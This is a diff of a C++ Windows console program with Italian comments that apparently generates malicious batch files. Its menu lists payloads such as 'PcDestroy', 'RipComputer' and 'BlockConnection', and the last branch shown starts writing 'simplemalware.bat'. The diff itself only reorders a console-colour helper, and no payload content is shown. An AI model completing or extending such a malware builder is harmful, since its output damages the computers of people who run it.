@@ -11,6 +11,11 @@ using namespace std;
  * distruggerlo.
  */
 
+void setcolor(unsigned short color){
+	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hcon, color);
+}
+
 void writeTextSquared(string s, unsigned short squarec, unsigned short txtc) {
 	setcolor(squarec);
 	cout << "[";
@@ -18,11 +23,6 @@ void writeTextSquared(string s, unsigned short squarec, unsigned short txtc) {
 	cout << s;
 	setcolor(squarec);
 	cout << "]" << endl;
-}
-
-void setcolor(unsigned short color){
-	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
-	SetConsoleTextAttribute(hcon, color);
 }
 
 
@@ -45,6 +45,7 @@ int main() {
 		getline(cin, scelta);
 		setcolor(4);
 		if (scelta == "list"){ // se l'utente esegue il comando "list", allora esegue questa parte del codice.
+
 			writeTextSquared("SimpleMalware", 7, 4);
 			writeTextSquared("PcDown", 7, 4);
 			writeTextSquared("RipComputer", 7, 4);
@@ -53,6 +54,7 @@ int main() {
 			writeTextSquared("BlockConnection", 7, 4);
 			writeTextSquared("PcDestroy", 7, 4);
 			writeTextSquared("SilentMalware", 7, 4);
+
 		}else if (scelta == "simplemalware" || scelta == "Simplemalware"){ // se invecec il comando è "simplemalware", allora esegue quanto segue
 			try {
 			ofstream simplemalware("simplemalware.bat"); // crea il file
